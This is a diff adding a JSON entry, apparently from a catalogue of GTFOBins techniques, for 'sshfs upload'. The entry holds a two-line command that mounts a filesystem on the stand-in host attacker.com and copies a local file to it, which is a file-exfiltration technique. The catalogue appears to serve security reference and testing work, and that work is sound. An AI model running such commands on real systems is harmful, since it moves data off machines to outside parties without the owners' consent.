@@ -1,0 +1,23 @@
+{
+  "id": "gtfo-sshfs-upload",
+  "name": "GTFOBins · sshfs (upload)",
+  "command": "sshfs user@attacker.com:/ /path/to/dir/\ncp /path/to/input-file /path/to/dir/",
+  "description": "Use sshfs to upload via GTFOBins.",
+  "platform": "linux",
+  "tags": [
+    "gtfobins",
+    "sshfs",
+    "upload"
+  ],
+  "source": "gtfobins",
+  "source_url": "https://gtfobins.github.io/gtfobins/sshfs/#upload",
+  "upstream_id": "sshfs/upload/0",
+  "category": "gtfobins",
+  "subcategory": "file-upload",
+  "references": [
+    {
+      "title": "GTFOBins",
+      "url": "https://gtfobins.github.io/gtfobins/sshfs/"
+    }
+  ]
+}
